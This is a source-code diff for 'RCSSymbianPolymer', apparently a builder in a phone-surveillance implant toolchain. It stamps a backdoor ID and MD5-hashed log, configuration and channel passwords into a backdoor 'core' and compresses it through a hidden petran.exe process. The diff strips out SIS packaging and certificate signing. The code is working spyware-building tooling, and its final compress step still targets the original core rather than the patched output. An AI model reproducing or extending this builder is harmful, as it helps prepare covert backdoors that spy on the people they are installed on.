@@ -6,37 +6,28 @@
 #include "fileutils.h"
 
 bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE *mark_b, UINT mark_len);
-extern BOOL SignSis(TCHAR *wsFile, TCHAR *wsCert, TCHAR *wsKey);
-extern BOOL CreateSis(UINT flag, TCHAR *wsFile);
-extern BOOL Compress(TCHAR *wsFile, BOOL flags);
+BOOL Compress(TCHAR *wsFile, BOOL flags);
 
 int _tmain(int argc, _TCHAR* argv[])
 {
-	HANDLE hFile;
 	BYTE *pBlockPtr	= NULL;
 	CHAR szBackdoorId[256];
 	CHAR szLogPassword[256];
 	CHAR szConfPassword[256];
 	CHAR szChanPassword[256];
-	WCHAR wsCERFile[MAX_PATH];
-	WCHAR wsKEYFile[MAX_PATH];
 	WCHAR wsCoreFile[MAX_PATH];
-	WCHAR wsUnFile[MAX_PATH];
 	WCHAR wsOutFile[MAX_PATH];
 	unsigned int iLen = 0;
 
-	if (argc != 9) {
+	if (argc != 7) {
 		printf("ERROR: \n");
-		printf("  usage:  RCSSymbianPolymer.exe  <bid> <log_pass> <conf_pass> <chanpass> <cer> <key> <core> <uninstaller> <output>\n\n");
+		printf("  usage:  RCSSymbianPolymer.exe  <bid> <log_pass> <conf_pass> <chanpass> <core> <output>\n\n");
 		printf("  <bid> is the backdoor_id\n");
 		printf("  <log_pass> is the password for the log encryption\n");
 		printf("  <conf_pass> is the password for the conf encryption\n");
 		printf("  <chanpass> is the password for the channel encryption\n");
-		printf("  <cer> is the certificate to sign the sysx\n");
-		printf("  <key> is the private key of the certificate\n");
 		printf("  <core> is the core to be polymerized\n");
-		printf("  <uninstaller> is the core uninstaller\n");
-		//printf("  <output> is the output file\n\n");
+		printf("  <output> is the output file\n\n");
 		return 0;
 	}
 
@@ -44,11 +35,8 @@ int _tmain(int argc, _TCHAR* argv[])
 	sprintf_s(szLogPassword, sizeof(szLogPassword), "%S", argv[2]);
 	sprintf_s(szConfPassword, sizeof(szConfPassword), "%S", argv[3]);
 	sprintf_s(szChanPassword, sizeof(szChanPassword), "%S", argv[4]);
-	wsprintf(wsCERFile, L"%s", argv[5]);
-	wsprintf(wsKEYFile, L"%s", argv[6]);
-	wsprintf(wsCoreFile, L"%s", argv[7]);
-	wsprintf(wsUnFile, L"%s", argv[8]);
-	//wsprintf(wsOutFile, L"%s", argv[9]);
+	wsprintf(wsCoreFile, L"%s", argv[5]);
+	wsprintf(wsOutFile, L"%s", argv[6]);
 
 	/************************************************************************/
 	/*  SANITY CHECKS                                                       */
@@ -73,20 +61,6 @@ int _tmain(int argc, _TCHAR* argv[])
 		return ERROR_EMBEDDING;
 	}
 
-	if ( (hFile = CreateFile(wsCERFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find CER file [%S]\n", wsCERFile);
-		return ERROR_EMBEDDING;
-	} else {
-		CloseHandle(hFile);
-	}
-
-	if ( (hFile = CreateFile(wsKEYFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL)) == INVALID_HANDLE_VALUE ) {
-		printf("Cannot find KEY file [%S]\n", wsKEYFile);
-		return ERROR_EMBEDDING;
-	} else {
-		CloseHandle(hFile);
-	}
-
 	/************************************************************************/
 	/*  READY TO GO                                                         */
 	/************************************************************************/
@@ -96,45 +70,22 @@ int _tmain(int argc, _TCHAR* argv[])
 	printf("LOG PASSWORD  [%s]\n", szLogPassword);
 	printf("CONF PASSWORD [%s]\n", szConfPassword);
 	printf("CHAN PASSWORD [%s]\n", szChanPassword);
-	printf("CERFILE       [%S]\n", wsCERFile);
-	printf("KEYFILE       [%S]\n", wsKEYFile);
 	printf("INPUT CORE    [%S]\n", wsCoreFile);
-	printf("UNINSTALLER   [%S]\n", wsUnFile);
-	//printf("OUTPUT FILE   [%S]\n\n", wsOutFile);
+	printf("OUTPUT FILE   [%S]\n\n", wsOutFile);
 
-
-	/************************************************************************/
-	/* UNINSTALLER SIS CREATION                                             */
-	/************************************************************************/
-
-	if (CreateSis(SIS_UNINST, wsUnFile))
-		printf("Creating uninstaller sis file... ok\n");
-	else {
-		printf("Cannot create uninstaller sis file [%S]\n", wsUnFile);
-		return ERROR_EMBEDDING;
-	}
-
-	/************************************************************************/
-	/* SIGNING THE UNINSTALLER                                              */
-	/************************************************************************/
-
-
-	if (SignSis(wsUnFile, wsCERFile, wsKEYFile))
-		printf("Using the certificate to sign the uninstaller... ok\n");
-	else {
-		printf("Cannot sign with the certificate file [%S][%S]\n", wsCERFile, wsKEYFile);
-		DeleteFile(wsOutFile);
-		return ERROR_EMBEDDING;
+	if (CopyFile(wsCoreFile, wsOutFile, FALSE) == FALSE) {
+		printf("Cannot create output file[%S]\n", wsOutFile);
+		return ERROR_OUTPUT;
 	}
 
 	/************************************************************************/
 	/* UNCOMPRESS                                                           */
 	/************************************************************************/
 
-	if (Compress(wsCoreFile, FALSE))
+	if (Compress(wsOutFile, FALSE))
 		printf("Uncompressing the core... ok\n");
 	else {
-		printf("Cannot uncompress file [%S]\n", wsCoreFile);
+		printf("Cannot uncompress file [%S]\n", wsOutFile);
 		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
@@ -145,7 +96,7 @@ int _tmain(int argc, _TCHAR* argv[])
 
 	BYTE bufmd5[MD5_DIGEST_LENGTH];
 
-	pBlockPtr = (BYTE *) LoadFile(wsCoreFile, &iLen);
+	pBlockPtr = (BYTE *) LoadFile(wsOutFile, &iLen);
 
 	// Patching Passwod dei log
 	MD5((const UCHAR *)szLogPassword, strlen(szLogPassword) , (PUCHAR) bufmd5);
@@ -182,14 +133,6 @@ int _tmain(int argc, _TCHAR* argv[])
 		return ERROR_EMBEDDING;
 	}
 
-	// Patching nome file configurazione
-	if (FindMemMarker(pBlockPtr, iLen, (BYTE *) CONFIG_FILENAME, wcslen(CONFIG_FILENAME) * sizeof(WCHAR), CONFIG_NAME_MARK, CONFIG_NAME_MARK_LEN))
-		printf("Config name embedded... ok\n");
-	else {
-		printf("Cannot embed Config Name [%S]\n", wsOutFile);
-		return ERROR_EMBEDDING;
-	}
-
 	UnloadFile(pBlockPtr);
 
 	/************************************************************************/
@@ -197,38 +140,12 @@ int _tmain(int argc, _TCHAR* argv[])
 	/************************************************************************/
 
 	if (Compress(wsCoreFile, TRUE))
-		printf("Uncompressing the core... ok\n");
+		printf("Compressing the core... ok\n");
 	else {
-		printf("Cannot uncompress file [%S]\n", wsCoreFile);
+		printf("Cannot compress file [%S]\n", wsCoreFile);
 		DeleteFile(wsOutFile);
 		return ERROR_EMBEDDING;
 	}
-
-	/************************************************************************/
-	/* FINAL SIS CREATION                                                   */
-	/************************************************************************/
-
-	if (CreateSis(SIS_CORE, wsCoreFile))
-		printf("Creating sis file... ok\n");
-	else {
-		printf("Cannot create sis file [%S]\n", wsCoreFile);
-		DeleteFile(wsOutFile);
-		return ERROR_EMBEDDING;
-	}
-
-	/************************************************************************/
-	/* SIGNING                                                              */
-	/************************************************************************/
-
-
-	if (SignSis(wsCoreFile, wsCERFile, wsKEYFile))
-		printf("Using the certificate to sign the code... ok\n");
-	else {
-		printf("Cannot sign with the certificate file [%S][%S]\n", wsCERFile, wsKEYFile);
-		DeleteFile(wsOutFile);
-		return ERROR_EMBEDDING;
-	}
-
 
 	printf("Output file... ok\n");
 
@@ -272,3 +189,47 @@ bool FindMemMarker(BYTE *pBlockPtr, UINT iLen, BYTE *block, UINT block_len, BYTE
 	return iRet;
 }
 
+BOOL Compress(TCHAR *wsFile, BOOL flags)
+{
+	char				szComm[2048];
+	STARTUPINFOA		start_Info;
+	PROCESS_INFORMATION proc_Info;
+	SECURITY_ATTRIBUTES sSec_attrib;
+	DWORD				dwRetCode, dwRet;
+	BOOL				bRet = FALSE;
+
+	if (wsFile == NULL)
+		return FALSE;
+
+	ZeroMemory(szComm, sizeof(szComm));	
+	ZeroMemory(&start_Info,  sizeof(start_Info));
+	ZeroMemory(&proc_Info,   sizeof(proc_Info));
+	ZeroMemory(&sSec_attrib, sizeof(sSec_attrib));
+
+	sSec_attrib.bInheritHandle = true;
+	sSec_attrib.nLength = sizeof(sSec_attrib);
+
+	start_Info.cb = sizeof(start_Info);
+	start_Info.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
+	start_Info.wShowWindow = SW_HIDE;
+
+	if (flags)
+		sprintf_s(szComm, sizeof(szComm), "\"petran.exe\" -compress %S", wsFile);
+	else
+		sprintf_s(szComm, sizeof(szComm), "\"petran.exe\" -nocompress %S", wsFile);
+
+	if ((bRet = CreateProcessA(NULL, szComm, 0, 0, true, 0, 0, 0, &start_Info, &proc_Info)) == false)
+		return bRet;
+
+	if( proc_Info.hProcess != INVALID_HANDLE_VALUE ) {
+		dwRet = WaitForSingleObject(proc_Info.hProcess, 600000);
+		GetExitCodeProcess(proc_Info.hProcess, &dwRetCode);
+	}
+
+	if( !bRet || dwRet == WAIT_TIMEOUT || dwRetCode != 0 ) { 
+		DWORD ret = GetLastError();
+		return false;
+	} 
+
+	return true;
+}
